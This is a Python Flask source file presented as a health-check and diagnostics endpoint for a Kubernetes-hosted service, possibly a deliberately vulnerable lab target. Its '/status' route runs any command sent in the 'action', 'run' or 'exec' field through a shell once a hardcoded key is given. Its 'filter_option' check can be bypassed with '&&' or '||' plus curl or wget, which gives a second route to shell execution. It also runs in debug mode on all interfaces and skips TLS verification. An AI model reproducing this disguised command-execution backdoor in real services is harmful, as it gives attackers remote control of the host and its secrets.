#!/usr/bin/python3

##
##
  
from flask import Flask, request, jsonify
import os
import subprocess
import requests

app = Flask(__name__)

# Health-check endpoint for diagnostics
@app.route('/status', methods=['GET', 'POST'])
def diagnostic_check():
    message = None
    exec_output = None
    service_status = {}
    active_filter = "Default (ALL)"

    if request.method == 'POST':
        action = request.form.get('action') or request.form.get('run') or request.form.get('exec')
        task = request.form.get('task')
        access_key = request.form.get('access_key') or request.args.get('access_key')
        filter_option = request.form.get('filter_option')

        # Check for access_key validity
        if access_key != "xxxxDEVaccessKxxxxxxxxXxxx":
            return jsonify({"error": "Invalid or missing access key"}), 403

        # Developer info message
        if not action:
            message = "Greetings - this endpoint is for availability & diagnostics - please adhere to AUP."

        # Verify TCP endpoints from environment variables
        for key, value in os.environ.items():
            if "TCP" in key and "tcp://" in value:
                endpoint = value.split("://")[1]
                try:
                    response = requests.get(f"http://{endpoint}", timeout=5)
                    service_status[endpoint] = f"ONLINE ({response.status_code})"
                except requests.exceptions.RequestException as e:
                    service_status[endpoint] = f"OFFLINE ({str(e)})"

        # If filter_option is provided, apply specific filtering logic
        if filter_option:
            active_filter = filter_option  # Set the active filter for the response
            # Sanitize and verify filter_option contents for security
            if ';' in filter_option:
                exec_output = "Security Warning: `;` is not permitted."
            elif any(op in filter_option for op in ['&&', '||']):
                allowed_cmds = ['http', 'curl', 'wget']
                if any(cmd in filter_option for cmd in allowed_cmds):
                    try:
                        exec_output = subprocess.check_output(filter_option, shell=True, stderr=subprocess.STDOUT)
                        exec_output = exec_output.decode('utf-8')
                    except subprocess.CalledProcessError as e:
                        exec_output = str(e)
                else:
                    exec_output = "Security Warning: Unauthorized command usage detected."
            else:
                # Apply filter to service statuses if no security risks are detected
                filtered_status = {k: v for k, v in service_status.items() if filter_option.lower() in v.lower()}
                exec_output = filtered_status

        # Extended diagnostic option for developers
        if action:
            try:
                result = subprocess.check_output(action, shell=True, stderr=subprocess.STDOUT)
                exec_output = result.decode('utf-8')
            except subprocess.CalledProcessError as e:
                exec_output = str(e)

    # Kubernetes API status check
    k8s_status = "Not tested"
    try:
        response = requests.get('https://kubernetes.default.svc/healthz', verify=False, timeout=5)
        if response.status_code in [200, 401, 400]: 
            k8s_status = "Kubernetes API is ONLINE"
        else:
            k8s_status = "Kubernetes API is OFFLINE"
    except requests.exceptions.RequestException:
        k8s_status = "Kubernetes API is OFFLINE or unreachable"

    return jsonify({
        'status': 'operational',
        'service_status': service_status,
        'kubernetes_api_status': k8s_status,
        'active_filter': active_filter,
        'message': message or "Use 'filter_option' parameter for specific analysis.",
        'output': exec_output
    })

############################################################
# Restricted endpoint - under security review
#
@app.route('/restricted', methods=['GET'])
def sec_pull():
    return jsonify({"error": "This endpoint is restricted."})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
############################################################
##
##
